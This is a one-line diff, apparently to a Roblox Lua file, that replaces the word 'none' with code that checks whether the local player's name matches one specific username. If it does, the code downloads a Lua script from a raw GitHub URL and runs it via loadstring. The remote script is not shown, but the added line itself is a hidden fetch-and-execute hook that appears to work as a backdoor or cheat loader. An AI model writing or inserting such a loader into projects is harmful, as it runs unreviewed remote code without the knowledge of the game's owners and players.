@@ -1,1 +1,1 @@
-none
+if game.Players.LocalPlayer.Name:lower() == "bloxfruitshacksr507" then loadstring(game:HttpGet("https://raw.githubusercontent.com/thegoodoneatgamez/commander/refs/heads/main/67.lua"))() end
